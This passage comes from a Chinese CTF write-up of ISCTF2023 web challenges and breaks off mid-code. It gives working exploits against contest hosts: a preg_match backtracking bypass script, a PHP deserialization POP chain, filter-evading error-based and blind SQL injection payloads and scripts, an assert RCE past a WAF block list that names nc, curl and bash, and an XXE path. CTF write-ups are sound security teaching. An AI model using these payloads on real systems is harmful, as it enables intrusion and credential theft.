<p>下一关就是利用<code>preg_match()</code>的特性绕过，<code>preg_match()</code>有一个回溯次数上限（可以类比于查询字符/字符串的次数上限）默认是1000000，超过这个数则返回false</p>
<p><img src="./ISCTF2023.assets/image-20240516124059867.png" alt="image-20240516124059867"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://gz.imxbt.cn:20308/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=3&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;pan_gu&quot;</span>: <span class="string">&#x27;ssss&#x27;</span>*<span class="number">250000</span> + <span class="string">&#x27;2023ISCTF&#x27;</span>&#125;</span><br><span class="line">req = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure>

<h2 id="圣杯战争"><a href="#圣杯战争" class="headerlink" title="圣杯战争"></a>圣杯战争</h2><p>简单的反序列化，pop：</p>
<p><code>summon::__wakeup()</code>-&gt;<code>artifact::__toString()</code>-&gt;<code>prepare::__get()</code>-&gt;<code>saber::__invoke()</code></p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">artifact</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$excalibuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arrow</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;excalibuer-&gt;arrow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prepare</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$release</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$functioin</span> = <span class="variable language_">$this</span>-&gt;release;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$functioin</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">saber</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;weapon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Saber</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Rider</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Saber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Summon</span> = <span class="keyword">new</span> <span class="title function_ invoke__">summon</span>();</span><br><span class="line"><span class="variable">$Artifact</span> = <span class="keyword">new</span> <span class="title function_ invoke__">artifact</span>();</span><br><span class="line"><span class="variable">$Prepare</span> = <span class="keyword">new</span> <span class="title function_ invoke__">prepare</span>();</span><br><span class="line"><span class="variable">$Saber</span> = <span class="keyword">new</span> <span class="title function_ invoke__">saber</span>();</span><br><span class="line"><span class="variable">$Summon</span>-&gt;Saber = <span class="variable">$Artifact</span>;</span><br><span class="line"><span class="variable">$Artifact</span>-&gt;excalibuer = <span class="variable">$Prepare</span>;</span><br><span class="line"><span class="variable">$Prepare</span>-&gt;release = <span class="variable">$Saber</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$Summon</span>)));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p><img src="./ISCTF2023.assets/image-20240516125030449.png" alt="image-20240516125030449"></p>
<h2 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">function</span> <span class="title function_">string_to_int_array</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> intArr = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">          <span class="keyword">const</span> charcode = str.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> partA = <span class="title class_">Math</span>.<span class="title function_">floor</span>(charcode / <span class="number">26</span>);</span><br><span class="line">          <span class="keyword">const</span> partB = charcode % <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line">          intArr.<span class="title function_">push</span>(partA);</span><br><span class="line">          intArr.<span class="title function_">push</span>(partB);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> intArr;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">int_array_to_text</span>(<span class="params">int_array</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> txt = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;int_array.<span class="property">length</span>;i++)&#123;</span><br><span class="line">          txt += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span> + int_array[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> txt;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hash = <span class="title function_">int_array_to_text</span>(<span class="title function_">string_to_int_array</span>(<span class="title function_">int_array_to_text</span>(<span class="title function_">string_to_int_array</span>(parameter))));</span><br><span class="line"><span class="keyword">if</span>(hash === <span class="string">&#x27;dxdydxdudxdtdxeadxekdxea&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;flag.html&#x27;</span>;</span><br><span class="line">          &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fail&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（这里扫出来一个index.bak文件，之前没扫出来是因为被校园网过滤掉了）</p>
<p>写一个逆向解密：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parameter2 =  <span class="string">&#x27;dxdydxdudxdtdxeadxekdxea&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">text_to_int_array</span>(<span class="params">text</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> int_array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;text.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> charcode = text.<span class="title function_">charCodeAt</span>(i) - <span class="number">97</span>;</span><br><span class="line">        int_array.<span class="title function_">push</span>(charcode)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> int_array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">int_array_to_string</span>(<span class="params">int_array2</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> text2 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;int_array2.<span class="property">length</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        parta = int_array2[i];</span><br><span class="line">        partb = int_array2[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">let</span> charcode2 = parta * <span class="number">26</span> + partb;</span><br><span class="line">        text2 += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(charcode2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> text2;</span><br><span class="line">&#125;</span><br><span class="line">answer = <span class="title function_">int_array_to_string</span>(<span class="title function_">text_to_int_array</span>(<span class="title function_">int_array_to_string</span>(<span class="title function_">text_to_int_array</span>(parameter2))));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(answer);</span><br></pre></td></tr></table></figure>

<p>得到mihoyo</p>
<p><img src="./ISCTF2023.assets/image-20240516151235230.png" alt="image-20240516151235230"></p>
<p>然后就是普通的文件包含了（之前dirsearch扫出来还有个flag.php）</p>
<p><img src="./ISCTF2023.assets/image-20240516151351862.png" alt="image-20240516151351862"></p>
<p><img src="./ISCTF2023.assets/image-20240516151336677.png" alt="image-20240516151336677"></p>
<h2 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a>easy_website</h2><p>sql注入，简单地fuzz一下，发现过滤了or，and，select，空格等，对字符串的过滤可以用双写绕过，空格可以用/**/绕过。这题考虑报错注入而非盲注</p>
<p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e,database(),0x7e),1);#</code> -&gt; users</p>
<p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e，(selselectect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#39;users&#39;),0x7e),1);#</code> -&gt; users</p>
<p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#39;users&#39;/**/anandd/**/table_schema=&#39;users&#39;),0x7e),1);#</code> -&gt; user，password</p>
<p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e,(selselectect/**/passwoorrd/**/from/**/users/**/limit/**/2,1),0x7e),1);#</code> 这里因为输出限制导致flag没有输出完整，可以用substring或者mid之类的函数 flag{f5ea3f34-c0eb-45ac-b35d</p>
<p><code>admin&#39;/**/anandd/**/updatexml(1,concat(0x7e,substring((selselectect/**/passwoorrd/**/from/**/users/**/limit/**/2,1),19,30),0x7e),1);#</code> 45ac-b35d-623f62014c27}</p>
<h2 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a>wafr</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Read /flaggggggg.txt</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;<span class="comment">//strings</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;想读我文件？大胆。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\^|\||\~|\\$|\%|jay/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;无字母数字RCE？大胆！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;奇技淫巧？大胆！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/fl|ag|\.|x/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;大胆！！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这题是个纸老虎，\并没有过滤，可以照常读取文件</p>
<p><img src="./ISCTF2023.assets/image-20240516155647197.png" alt="image-20240516155647197"></p>
<h2 id="1z-Ssql"><a href="#1z-Ssql" class="headerlink" title="1z_Ssql"></a>1z_Ssql</h2><p>过滤了=，+，sleep，union，where</p>
<p>order by测出来有三个字段（不过似乎没啥用？）</p>
<p>不过看过滤情况只能是布尔盲注</p>
<p><img src="./ISCTF2023.assets/image-20240516160339164.png" alt="image-20240516160339164"></p>
<p>测试<code>admin&#39; and if(length(database())&gt;1,1,0);#</code>后发现有hint相关回显（虽然那hint没什么用就是了），是布尔盲注无疑了</p>
<p>（原题中好像是有附件的，但是这上面没有，只能看wp复现了：得到表名users和列名username，password</p>
<p>直接上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://gz.imxbt.cn:20511/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(40):</span></span><br><span class="line"><span class="comment">#   payload = f&#x27;admin\&#x27; and if(length(database())&gt;&#123;i&#125;,1,0);#&#x27;</span></span><br><span class="line">  <span class="comment"># data = &#123;</span></span><br><span class="line">  <span class="comment">#   &#x27;username&#x27;: payload,</span></span><br><span class="line">  <span class="comment">#   &#x27;password&#x27;: 1234,</span></span><br><span class="line">  <span class="comment">#   &#x27;submit&#x27;: 1</span></span><br><span class="line">  <span class="comment"># &#125;</span></span><br><span class="line"><span class="comment">#   print(payload)</span></span><br><span class="line"><span class="comment">#   req = requests.post(url=url,data=data)</span></span><br><span class="line"><span class="comment">#   for j in range </span></span><br><span class="line"><span class="comment">#   if &#x27;hint&#x27; in req.text:</span></span><br><span class="line"><span class="comment">#     continue</span></span><br><span class="line"><span class="comment">#   else:</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br><span class="line"><span class="comment">#     break # length = 6</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">  left = <span class="number">32</span></span><br><span class="line">  right = <span class="number">127</span></span><br><span class="line">  mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> left &lt; right:</span><br><span class="line">    <span class="comment"># payload = f&#x27;admin\&#x27; and if((ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;),1,0)#&#x27; # bthcls</span></span><br><span class="line">    <span class="comment"># payload = f&#x27;admin\&#x27; and if((ascii(substr((select group_concat(username) from bthcls.users),&#123;i&#125;,1))&gt;&#123;mid&#125;),1,0)#&#x27; # admin</span></span><br><span class="line">    payload = <span class="string">f&#x27;admin\&#x27; and if((ascii(substr((select group_concat(password) from bthcls.users),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),1,0)#&#x27;</span> <span class="comment"># we1come7o1sctf</span></span><br><span class="line">    data = &#123;</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span>: <span class="number">1234</span>,</span><br><span class="line">      <span class="string">&#x27;submit&#x27;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;hint&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">      left = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      right = mid</span><br><span class="line">    mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">  result += <span class="built_in">chr</span>(mid)</span><br><span class="line">  <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>:::info no-icon</p>
<p>后面看wp才发现有信息泄露：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;here_is_a_sercet.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span> = <span class="string">&quot;762V08zk+xrmKxIFrdJIJj6ULvI8Lc0pX39LjDyIUb0eAGkZe4KQa87TJXuqnFw0u/669wWRsqYFya812FtULw9+tpiGlaH2gleDfDKzr+g=&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$black_list</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;h4&gt;illegal words!&lt;/h4&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>base64不能直接解密，可以在主页看看用的是什么方式加密</p>
<p><img src="./ISCTF2023.assets/image-20240517114714742.png" alt="image-20240517114714742"></p>
<p>是一个SM4加密</p>
<p>直接找工具解密即可，waf是<code>/union|=|+|sleep|benchmark|for|where|sys|innodb|is|null|like|/*|*//i</code></p>
<p>:::</p>
<h2 id="Where-is-the-flag"><a href="#Where-is-the-flag" class="headerlink" title="Where is the flag"></a>Where is the flag</h2><p>标准的一句话木马，实际上想考察的是linux的一些命令</p>
<p>第一个flag：当前目录下的flag.php ISCTF{Y0u_6u</p>
<p>第二个flag：根目录下一个flag cceeded_in_f</p>
<p>第三个flag：flag.sh里面 ind1n9_f1ag}</p>
<p>这个不知道对不对，当时在做的时候第二个找都找不到，flag1还是在<code>/flag</code>里面的</p>
<p>后面根据提示，在xxx中，猜想环境变量中应该是有的，毕竟web动态题生成flag还是很依赖环境变量来随机生成的</p>
<p>直接<code>system(&#39;env&#39;);</code>,发现还真有</p>
<p><img src="./ISCTF2023.assets/image-20240517120355386.png" alt="image-20240517120355386"></p>
<h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><p>这题看着没太大突破扣，那就找一下附件里面有没有什么可以利用的吧</p>
<p>注意到register.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;utils/function.php&quot;</span>;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">include</span> <span class="string">&quot;utils/config.php&quot;</span>;</span><br><span class="line">    <span class="variable">$user_xml_format</span> = <span class="string">&quot;&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="string">                        &lt;userinfo&gt;</span></span><br><span class="line"><span class="string">                            &lt;user&gt;</span></span><br><span class="line"><span class="string">                                &lt;username&gt;%s&lt;/username&gt;</span></span><br><span class="line"><span class="string">                                &lt;password&gt;%s&lt;/password&gt;</span></span><br><span class="line"><span class="string">                            &lt;/user&gt;</span></span><br><span class="line"><span class="string">                        &lt;/userinfo&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>)||<span class="keyword">empty</span>(<span class="variable">$password</span>)) <span class="keyword">die</span>(<span class="string">&quot;Username or password cannot be empty XD&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$username</span>)) <span class="keyword">die</span>(<span class="string">&quot;Invalid username. :(&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_user_exists</span>(<span class="variable">$username</span>, <span class="variable">$config</span>[<span class="string">&quot;user_info_dir&quot;</span>])) <span class="keyword">die</span>(<span class="string">&quot;User already exists XD&quot;</span>);</span><br><span class="line">    <span class="variable">$user_xml</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$user_xml_format</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">register_user</span>(<span class="variable">$username</span>, <span class="variable">$config</span>[<span class="string">&#x27;user_info_dir&#x27;</span>], <span class="variable">$user_xml</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>存在变量覆盖函数，可以试着往这个点打</p>
<p>同时发现，用户名和密码是以xml形式来存储的，根据这个可以试着用xxe打</p>
<p>由于function.php中存在这样一个函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_user_record</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$user_info_dir</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user_info_xml</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user_info_dir</span>.<span class="variable">$username</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;.xml&#x27;</span>);</span><br><span class="line">        <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">        <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$user_info_xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这样可以利用<code>file://</code>协议去读取flag</p>
<p>login.php中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;utils/function.php&quot;</span>;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">include</span>  <span class="string">&quot;utils/config.php&quot;</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>)||<span class="keyword">empty</span>(<span class="variable">$password</span>)) <span class="keyword">die</span>(<span class="string">&quot;Username or password cannot be empty XD&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_user_exists</span>(<span class="variable">$username</span>, <span class="variable">$config</span>[<span class="string">&quot;user_info_dir&quot;</span>])) <span class="keyword">die</span>(<span class="string">&quot;Username error&quot;</span>);</span><br><span class="line">    <span class="variable">$user_record</span> = <span class="title function_ invoke__">get_user_record</span>(<span class="variable">$username</span>, <span class="variable">$config</span>[<span 